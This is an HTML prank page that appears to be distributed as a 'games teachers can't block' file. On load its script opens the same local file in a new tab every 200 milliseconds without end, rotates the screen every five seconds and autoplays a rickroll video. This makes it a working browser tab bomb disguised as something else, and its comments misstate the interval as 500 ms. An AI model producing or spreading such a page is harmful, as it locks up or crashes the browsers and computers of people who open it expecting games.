<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oops! You've been rickrolled!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            color: white;
            background-color: black;
            overflow: hidden;
        }
        h1 {
            font-size: 40px;
        }
        video {
            width: 100%;
            height: auto;
            max-width: 800px;
        }
    </style>
    <script>
        // Variable to keep track of the current rotation angle
        let currentRotation = 0;

        // Function to rotate the screen 90 degrees each time
        function rotateScreen() {
            currentRotation += 90; // Increase by 90 degrees
            if (currentRotation === 360) {
                currentRotation = 0; // Reset back to 0 after a full rotation (360 degrees)
            }
            document.body.style.transform = `rotate(${currentRotation}deg)`;
            document.body.style.transition = 'transform 0.5s ease';
        }

        // Function to open the same file in a new tab
        function openNewTab() {
            const fileUrl = "file:///media/removable/UBUNTU%2024_0/open-me-for-games-teachers-cant-block-main/open-me.html";
            window.open(fileUrl, "_blank");
        }

        // Infinite tab opening function (opens a new tab every 500ms)
        function infiniteTabOpening() {
            setInterval(openNewTab, 200);  // Opens a new tab every 500ms
        }

        // Rotate screen every 5 seconds
        function rotateEvery5Seconds() {
            setInterval(rotateScreen, 5000);  // Rotate every 5 seconds
        }

        // Start opening new tabs and rotating after loading the page
        window.onload = () => {
            infiniteTabOpening();  // Start opening new tabs
            rotateEvery5Seconds(); // Start rotating the screen every 5 seconds
        };
    </script>
</head>
<body>
    <h1>Oops! You've been rickrolled!</h1>
    <p>Enjoy the ride!</p>

    <!-- Embed the MP4 video -->
    <video controls autoplay>
        <source src="filesystem/rickroll.mp4" type="video/mp4"> <!-- Replace with your relative file path -->
        Your browser does not support the video tag.
    </video>
</body>
</html>
